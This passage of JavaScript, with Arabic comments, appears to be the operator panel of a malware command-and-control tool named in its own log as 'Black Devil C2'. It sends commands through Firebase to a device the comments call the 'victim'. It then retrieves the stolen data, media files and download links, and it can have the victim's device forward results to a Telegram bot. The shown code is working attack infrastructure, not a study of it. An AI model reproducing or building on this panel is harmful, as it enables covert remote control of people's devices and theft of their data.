        const page = document.getElementById('commandPage');

        }
        else if (type === 'C') { // وسائط (صور، فيديوهات)
            buttons.push({ id: 'download', label: '⬇️ تحميل الملف', class: 'btn-download' });
            buttons.push({ id: 'open', label: '📂 فتح (المشغل)', class: 'btn-open' });
        }
        else if (type === 'D') { // أوامر تنفيذية
            // فقط تنفيذ + بوت (قد نضيف نسخ للحالة)
            buttons.push({ id: 'copy', label: '📋 نسخ الحالة', class: 'btn-copy' });
        }

        buttons.forEach(btn => {
            const button = document.createElement('button');
            button.className = btn.class;
            button.innerText = btn.label;
            button.id = `btn_${btn.id}`;
            button.onclick = () => handleAction(btn.id);
            footer.appendChild(button);
        });
    }

    // جلب النتيجة من Firebase
    function fetchCommandResult(cmdId) {
        const deviceId = 'device_test'; // افتراضي
        const resultRef = db.ref(`devices/${deviceId}/data/${cmdId}`);
        resultRef.once('value').then(snapshot => {
            const data = snapshot.val();
            const body = document.getElementById('cmdBody');
            if (data) {
                // عرض البيانات
                let content = '<div class="result-box">';
                if (typeof data === 'string' && (data.startsWith('http') || data.includes('firebasestorage'))) {
                    // رابط ملف
                    content += `<a href="${data}" target="_blank" class="file-link">📁 تحميل الملف من الرابط: ${data}</a>`;
                    content += `<br><small>اضغط على الرابط للتحميل المباشر</small>`;
                } else if (typeof data === 'object') {
                    content += JSON.stringify(data, null, 2);
                } else {
                    content += data;
                }
                content += '</div>';
                body.innerHTML = content;
                document.getElementById('pageStatus').innerText = '✅ تم التنفيذ';
            } else {
                body.innerHTML = '<div class="result-box">⚠️ لا توجد بيانات لهذا الأمر بعد. اضغط "تنفيذ" لإرسال الأمر إلى الضحية.</div>';
                document.getElementById('pageStatus').innerText = '⏳ انتظار التنفيذ';
            }
        }).catch(err => {
            document.getElementById('cmdBody').innerHTML = `<div class="result-box">❌ خطأ في Firebase: ${err.message}</div>`;
        });
    }

    // ================================================================
    //  4.  معالجة الأزرار (الإجراءات)
    // ================================================================
    function handleAction(actionId) {
        const cmdId = currentCommandId;
        const deviceId = 'device_test';

        if (actionId === 'execute') {
            // إرسال الأمر إلى Firebase (commands/{deviceId})
            db.ref(`commands/${deviceId}`).set({
                command: cmdId,
                timestamp: Date.now()
            }).then(() => {
                document.getElementById('pageStatus').innerText = '📤 تم إرسال الأمر للضحية...';
                // انتظر ثواني ثم جلب النتيجة
                setTimeout(() => fetchCommandResult(cmdId), 3000);
            }).catch(e => alert('خطأ في الإرسال: ' + e.message));
        }
        else if (actionId === 'telegram') {
            // إرسال النتيجة الحالية إلى البوت عبر Firebase (سيتم معالجتها من الضحية)
            db.ref(`commands/${deviceId}`).set({
                command: `send_to_telegram_${cmdId}`,
                timestamp: Date.now()
            }).then(() => {
                alert('✅ تم طلب إرسال النتيجة إلى البوت');
            }).catch(e => alert('❌ فشل الإرسال: ' + e.message));
        }
        else if (actionId === 'copy') {
            // نسخ النص الموجود في منطقة النتائج
            const resultBox = document.querySelector('#cmdBody .result-box');
            if (resultBox) {
                const text = resultBox.innerText;
                navigator.clipboard.writeText(text).then(() => {
                    alert('✅ تم نسخ المحتوى إلى الحافظة');
                }).catch(() => {
                    // بديل للنسخ
                    const area = document.createElement('textarea');
                    area.value = text;
                    document.body.appendChild(area);
                    area.select();
                    document.execCommand('copy');
                    area.remove();
                    alert('✅ تم النسخ (طريقة بديلة)');
                });
            } else {
                alert('❌ لا يوجد نص لنسخه');
            }
        }
        else if (actionId === 'download') {
            // تحميل الملف (إذا كان رابطاً)
            const link = document.querySelector('#cmdBody .file-link');
            if (link && link.href) {
                const a = document.createElement('a');
                a.href = link.href;
                a.download = link.href.split('/').pop() || 'file';
                document.body.appendChild(a);
                a.click();
                a.remove();
            } else {
                // إذا كان النص يحتوي على رابط مباشر
                const bodyText = document.querySelector('#cmdBody .result-box')?.innerText || '';
                const urlMatch = bodyText.match(/(https?:\/\/[^\s]+)/);
                if (urlMatch) {
                    window.open(urlMatch[0], '_blank');
                } else {
                    alert('❌ لا يوجد رابط تحميل متاح');
                }
            }
        }
        else if (actionId === 'open') {
            // فتح الملف (محاولة فتح الرابط أو تنزيل ثم فتح)
            const link = document.querySelector('#cmdBody .file-link');
            if (link && link.href) {
                window.open(link.href, '_blank');
            } else {
                alert('❌ لا يوجد ملف لفتحه');
            }
        }
    }

    // ================================================================
    //  5.  الرجوع إلى القائمة الرئيسية
    // ================================================================
    document.getElementById('backToMenu').onclick = function() {
        document.getElementById('commandPage').classList.remove('active');
        document.getElementById('mainMenu').classList.remove('hidden');
        // إلغاء الاستماع إذا وجد
    };

    // ================================================================
    //  6.  تشغيل التطبيق
    // ================================================================
    renderMainMenu();

    console.log('🔥 Black Devil C2 Ultra-Wide Panel Loaded. 490+ Pages Ready.');
</script>
</body>
